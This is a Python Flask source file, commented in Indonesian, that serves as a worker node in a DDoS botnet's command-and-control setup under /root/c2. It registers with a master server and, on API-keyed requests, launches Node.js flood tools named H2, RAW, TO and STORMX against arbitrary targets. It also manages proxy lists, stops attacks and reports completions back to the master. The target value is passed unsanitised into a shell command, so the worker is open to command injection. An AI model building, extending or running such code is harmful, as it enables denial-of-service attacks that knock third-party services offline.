#!/usr/bin/env python3
from flask import Flask, request, jsonify
import subprocess
import json
import os
import signal
import time
import socket
import psutil
from datetime import datetime
import threading

app = Flask(__name__)

# Load config
CONFIG_PATH = '/root/c2/config.json'
if os.path.exists(CONFIG_PATH):
    with open(CONFIG_PATH, 'r') as f:
        CONFIG = json.load(f)
else:
    CONFIG = {
        'worker_name': 'unknown',
        'worker_ip': '0.0.0.0',
        'worker_port': 5001,
        'master_ip': '127.0.0.1',
        'master_port': 5000,
        'api_key': 'default_key',
        'max_bots': 10000
    }

WORKER_NAME = CONFIG['worker_name']
WORKER_IP = CONFIG['worker_ip']
WORKER_PORT = CONFIG['worker_port']
MASTER_IP = CONFIG['master_ip']
MASTER_PORT = 5000
API_KEY = CONFIG['api_key']
MAX_BOTS = CONFIG['max_bots']

active_attacks = []
attack_processes = {}

def verify_api_key(headers):
    """Verifikasi API key"""
    api_key = headers.get('X-API-Key')
    return api_key == API_KEY

def get_system_info():
    """Dapatkan informasi sistem"""
    try:
        return {
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'disk_usage': psutil.disk_usage('/').percent,
            'uptime': time.time() - psutil.boot_time()
        }
    except:
        return {}

@app.route('/status', methods=['GET'])
def status():
    """Endpoint untuk cek status worker"""
    # Cek proses Node.js yang berjalan
    node_processes = 0
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'H2.js' in line or 'RAW.js' in line or 'TO.js' in line or 'STORMX.js' in line:
                node_processes += 1
    except:
        pass
    
    # Cek proxy count
    proxy_count = 0
    proxy_path = '/root/c2/tools/proxy.txt'
    if os.path.exists(proxy_path):
        with open(proxy_path, 'r') as f:
            proxy_count = len(f.readlines())
    
    return jsonify({
        'name': WORKER_NAME,
        'status': 'online',
        'active_attacks': len(active_attacks),
        'node_processes': node_processes,
        'proxy_count': proxy_count,
        'system': get_system_info(),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/attack', methods=['POST'])
def start_attack():
    """Endpoint untuk memulai serangan"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    data = request.json
    method = data.get('method')
    target = data.get('target')
    duration = int(data.get('duration', 60))
    rate = data.get('rate', 1000)
    threads = int(data.get('threads', 100))
    
    if not method or not target:
        return jsonify({'error': 'Missing parameters'}), 400
    
    attack_id = f"{WORKER_NAME}_{int(time.time())}"
    
    # Pilih tool Node.js berdasarkan method
    tool_map = {
        'H2': f"node /root/c2/tools/H2.js {target} {duration} {rate} {threads}",
        'RAW': f"node /root/c2/tools/RAW.js {target} {duration} {threads}",
        'TO': f"node /root/c2/tools/TO.js {target} {duration} {threads} {rate}",
        'STORMX': f"node /root/c2/tools/STORMX.js {target} {duration} {threads} {rate}"
    }
    
    if method not in tool_map and method != 'ALL':
        return jsonify({'error': 'Invalid method'}), 400
    
    def run_attack():
        try:
            if method == 'ALL':
                import random
                actual_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
                cmd = tool_map[actual_method]
            else:
                cmd = tool_map[method]
            
            # Jalankan Node.js process
            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                cwd='/root/c2'
            )
            
            attack_processes[attack_id] = process
            
            attack_info = {
                'id': attack_id,
                'method': method,
                'target': target,
                'duration': duration,
                'rate': rate,
                'threads': threads,
                'start_time': datetime.now().strftime("%H:%M:%S"),
                'pid': process.pid,
                'status': 'running'
            }
            
            active_attacks.append(attack_info)
            
            # Tunggu selesai
            process.wait()
            
            # Update status
            for attack in active_attacks:
                if attack['id'] == attack_id:
                    attack['status'] = 'completed'
                    break
            
            # Cleanup
            if attack_id in attack_processes:
                del attack_processes[attack_id]
            
            # Report ke master jika perlu
            try:
                import requests
                requests.post(
                    f"http://{MASTER_IP}:{MASTER_PORT}/task_complete",
                    json={'worker': WORKER_NAME, 'attack_id': attack_id},
                    headers={'X-API-Key': API_KEY},
                    timeout=2
                )
            except:
                pass
                    
        except Exception as e:
            print(f"[!] Error in attack thread: {e}")
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'started',
        'attack_id': attack_id,
        'worker': WORKER_NAME,
        'method': method,
        'tool': 'Node.js',
        'pid': thread.ident
    })

@app.route('/stop', methods=['POST'])
def stop_attack():
    """Endpoint untuk menghentikan serangan tertentu"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    data = request.json
    attack_id = data.get('attack_id')
    
    if not attack_id:
        return jsonify({'error': 'Missing attack_id'}), 400
    
    if attack_id in attack_processes:
        try:
            # Terminate process
            attack_processes[attack_id].terminate()
            
            # Kill juga via pkill untuk memastikan
            subprocess.run(['pkill', '-f', f'attack_id={attack_id}'], check=False)
            
            del attack_processes[attack_id]
            
            # Remove from active attacks
            for attack in active_attacks:
                if attack['id'] == attack_id:
                    active_attacks.remove(attack)
                    break
            
            return jsonify({'status': 'stopped', 'attack_id': attack_id})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Attack not found'}), 404

@app.route('/stop_all', methods=['POST'])
def stop_all():
    """Endpoint untuk menghentikan semua serangan"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    # Kill semua proses Node.js attack
    try:
        subprocess.run(['pkill', '-f', 'H2.js'], check=False)
        subprocess.run(['pkill', '-f', 'RAW.js'], check=False)
        subprocess.run(['pkill', '-f', 'TO.js'], check=False)
        subprocess.run(['pkill', '-f', 'STORMX.js'], check=False)
        subprocess.run(['pkill', '-f', 'node.*tools/'], check=False)
    except:
        pass
    
    # Terminate semua process objects
    for pid, process in list(attack_processes.items()):
        try:
            process.terminate()
        except:
            pass
    
    attack_processes.clear()
    active_attacks.clear()
    
    return jsonify({'status': 'all_stopped', 'message': 'All attacks terminated'})

@app.route('/upload_proxy', methods=['POST'])
def upload_proxy():
    """Endpoint untuk upload proxy file"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    if 'proxy' not in request.files:
        return jsonify({'error': 'No file'}), 400
    
    file = request.files['proxy']
    
    # Simpan di folder tools
    tools_dir = '/root/c2/tools'
    if not os.path.exists(tools_dir):
        os.makedirs(tools_dir)
    
    # Simpan di tools/proxy.txt
    tools_path = os.path.join(tools_dir, 'proxy.txt')
    file.save(tools_path)
    
    # Baca untuk validasi
    with open(tools_path, 'r') as f:
        proxy_lines = f.readlines()
    
    # Juga simpan di root untuk kompatibilitas
    try:
        with open('/root/c2/proxy.txt', 'w') as f:
            with open(tools_path, 'r') as pf:
                f.write(pf.read())
    except:
        pass
    
    return jsonify({
        'status': 'ok', 
        'message': 'Proxy updated in tools folder',
        'total': len(proxy_lines),
        'path': '/root/c2/tools/proxy.txt'
    })

@app.route('/tasks', methods=['GET'])
def get_tasks():
    """Endpoint untuk mendapatkan daftar task aktif"""
    return jsonify({
        'worker': WORKER_NAME,
        'active_attacks': active_attacks,
        'total': len(active_attacks)
    })

@app.route('/info', methods=['GET'])
def get_info():
    """Endpoint untuk mendapatkan informasi worker"""
    return jsonify({
        'name': WORKER_NAME,
        'ip': WORKER_IP,
        'port': WORKER_PORT,
        'api_key': API_KEY[:8] + '...',
        'max_bots': MAX_BOTS,
        'tools': ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js'],
        'active_attacks': len(active_attacks)
    })

def register_to_master():
    """Daftarkan worker ke master"""
    try:
        import requests
        data = {
            'name': WORKER_NAME,
            'ip': WORKER_IP,
            'port': WORKER_PORT,
            'max_bots': MAX_BOTS
        }
        response = requests.post(
            f"http://{MASTER_IP}:{MASTER_PORT}/register_worker",
            json=data,
            headers={'X-API-Key': API_KEY},
            timeout=5
        )
        if response.status_code == 200:
            print(f"[✓] Registered to master {MASTER_IP}:{MASTER_PORT}")
        else:
            print(f"[!] Failed to register to master: {response.text}")
    except Exception as e:
        print(f"[!] Cannot register to master: {e}")

if __name__ == '__main__':
    # Buat direktori
    os.makedirs('/root/c2/logs', exist_ok=True)
    os.makedirs('/root/c2/tools', exist_ok=True)
    
    print(f"\n[✓] Worker {WORKER_NAME} started on port {WORKER_PORT}")
    print(f"[✓] PID: {os.getpid()}")
    print(f"[✓] Using Node.js tools for attacks")
    print(f"[✓] API Key: {API_KEY[:8]}...")
    print(f"[✓] Tools directory: /root/c2/tools")
    
    # Register ke master setelah 2 detik
    threading.Timer(2.0, register_to_master).start()
    
    # Jalankan Flask app
    app.run(host='0.0.0.0', port=WORKER_PORT, debug=False, threaded=True)